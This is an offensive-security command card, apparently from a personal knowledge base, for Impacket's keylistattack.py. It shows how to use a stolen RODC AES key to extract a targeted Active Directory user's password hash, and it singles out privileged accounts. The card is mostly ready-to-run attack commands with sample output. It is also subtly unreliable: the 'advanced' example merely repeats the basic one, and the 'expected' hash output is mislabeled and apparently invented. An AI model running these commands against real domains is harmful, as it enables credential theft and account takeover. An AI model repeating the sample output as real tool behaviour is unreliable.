---
type: command
executor: bash
data: >-
  keylistattack.py -kdc $_KDC_HOST -t $_TARGET_USER -rodcNo $_RODC_NO -rodcKey
  $_RODC_KEY LIST
tags:
  - credential-access
  - active-directory
platforms:
  - Linux
verified: true
validated: true
---

# impacket-keylistattack-target-user

## Command

```bash
keylistattack.py -kdc $_KDC_HOST -t $_TARGET_USER -rodcNo $_RODC_NO -rodcKey $_RODC_KEY LIST
```

## Description

This command targets a specific user to extract their hash from the RODC key list using Impacket's keylistattack.py, useful for focusing on privileged accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -kdc $_KDC_HOST | KDC hostname or IP | Yes |
| -t $_TARGET_USER | Specific username to query | Yes |
| -rodcNo $_RODC_NO | RODC identifier number | Yes |
| -rodcKey $_RODC_KEY | RODC AES key in hex | Yes |
| LIST | Operation to list the key for the target | Yes |

## Examples

### Basic Usage

```bash
keylistattack.py -kdc dc1.lab.local -t admin -rodcNo 25078 -rodcKey eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 LIST
```

### Advanced Usage

Combine with authentication if needed (though this variant uses direct KDC):

```bash
keylistattack.py -kdc dc1.lab.local -t admin -rodcNo 25078 -rodcKey eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545 LIST
```

## Expected Output

Targeted user hash:

```
[*] Target user: admin
RID: 1136
LMHASH: aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
[*] Extraction complete for 1 user.
```

## Related

- [[procedures/RODC-Key-List-Extraction-and-Golden-Ticket-Creation]]
- [[tools/Impacket]]
